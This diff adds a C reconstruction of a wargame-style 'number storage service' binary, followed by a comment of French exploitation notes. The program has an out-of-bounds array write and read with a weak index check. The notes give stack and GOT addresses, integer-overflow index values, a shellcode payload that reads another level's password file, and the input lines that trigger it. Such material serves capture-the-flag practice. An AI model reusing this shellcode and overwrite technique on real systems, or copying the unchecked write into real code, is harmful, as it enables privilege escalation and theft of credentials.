@@ -1,0 +1,165 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+unsigned int get_unum();
+
+int read_number(unsigned int tab[25])
+{
+	unsigned int i;
+
+	i = 0;
+	printf(" Index: ");
+	i = get_unum();
+	printf(" Number at data[%u] is %u\n", i, tab[i]);
+	return (0);
+}
+
+void clear_stdin()
+{
+	char c;
+
+	c = 0;
+	while (c != '\n' && c != EOF)
+		c = getchar();
+}
+
+unsigned int get_unum()
+{
+	unsigned int i;
+
+	i = 0;
+	fflush(stdout);
+	scanf("%u", &i);
+	clear_stdin();
+	return (i);
+}
+
+int store_number(unsigned int tab[25])
+{
+	int		number;
+	int		index;
+
+	printf(" Number: ");
+	number = get_unum();
+	printf(" Index: ");
+	index = get_unum();
+	if (index - ((index * 0xaaaaaaabL) >> 0x21) * 3 == 0 || number >> 0x18 == 0xb7)
+	{
+		puts(" *** ERROR! ***");
+		puts("   This index is reserved for wil!");
+		puts(" *** ERROR! ***");
+		return (1);
+	} else {
+		tab[index] = number;
+		return (0);
+	}
+}
+
+int main(int ac, char **argv, char **argenv)
+{
+	int len;
+	char **env;
+	char **av;
+	unsigned int tab[25];
+	int	tabi;
+	char buff[20] = {0};
+
+	env = argenv;
+	av = argv;
+	tabi = 0;
+	memset(tab, 0, sizeof(tab));
+	while (*av)
+	{
+		len = -1;
+		memset(*av, 0, strlen(*av));
+		av++;
+	}
+	while (*env)
+	{
+		len = -1;
+		memset(*env, 0, strlen(*env));
+		env++;
+	}
+	puts("----------------------------------------------------\n  Welcome to wil's crappy number storage service!\n----------------------------------------------------\n Commands:\n    store - store a number into the data storage\n    read  - read a number from the data storage\n    quit  - exit the program\n----------------------------------------------------\n   wil has reserved some storage :>\n----------------------------------------------------");
+	while (42)
+	{
+		printf("Input command: ");
+		tabi = 1;
+		fgets(buff, 20, stdin);
+		buff[strlen(buff) - 1] = '\0';
+		if (strncmp("store", buff, 5) == 0)
+			tabi = store_number(tab);
+		else if (strncmp("read", buff, 4) == 0)
+			tabi = read_number(tab);
+		else if (strncmp("quit", buff, 4) == 0)
+			return (0);
+		if (tabi != 0)
+			printf(" Failed to do %s command\n", buff);
+		else
+			printf(" Completed %s command successfully\n", buff);
+	}
+	return (0);
+}
+
+/*
+buffer : 0xffffd544
+
+0x2ABB
+
+eip de store_number : 0xffffd51c
+
+(buffer - eip) / 4 = 10
+
+plt :
+0x0804a000 printf
+0x0804a004 fflush
+0x0804a008 getchar
+0x0804a00c fgets
+0x0804a010 __stack_chk_fail
+0x0804a014 puts
+0x0804a018 __gmon_start__
+0x0804a01c __libc_start_main
+0x0804a020 memset
+0x0804a024 __isoc99_scanf
+
+addr = buff + index * 4
+
+index * 4 = addr - buff
+index  = (addr - buff) / 4
+
+3254860936
+
+3254860939
+
+17674
+
+134520844
+
+pour peter le canary : 106
+
+system : 0xf7e6aed0 - -135876912
+
+export BINSH=`python -c "print '\x90' * 10000 + '\xeb''\x2d''\x31''\xc0''\xb0''\x05''\x5b''\x31''\xc9''\x31''\xd2''\x66''\xba''\xff''\x01''\xcd''\x80''\xb9''\xdc''\xbf''\xff''\xff''\x89''\xc3''\x31''\xc0''\xb0''\x03''\x31''\xd2''\xb2''\x29''\xcd''\x80''\x89''\xc2''\x31''\xc0''\xb0''\x04''\x31''\xdb''\xb3''\x01''\xcd''\x80''\xc3''\xe8''\xce''\xff''\xff''\xff''\x2f''\x68''\x6f''\x6d''\x65''\x2f''\x75''\x73''\x65''\x72''\x73''\x2f''\x6c''\x65''\x76''\x65''\x6c''\x30''\x38''\x2f''\x2e''\x70''\x61''\x73''\x73'"`
+adresse du shellcode : 0xffffbaf5
+
+python -c print "'store\n' + '\xdc''\xfb''\xff''\xff' + '\n' + '3254860936\n' + 'store\n'
+
+python -c print "'store\n' + '-16419\n' + '3254860936\n' + 'store\n'
+
+2f 74 6d 70    2f 73 00 00
+
+70 6d 74 2f    00 00 73 2f
+
+
+
+adresse de tab : 
+0xffffd730 = -10447 = 4294956848
+
+adresse du truc dans la plt :
+0x0804a010  = 134520848
+
+3254858419
+-135876912
+
+*/
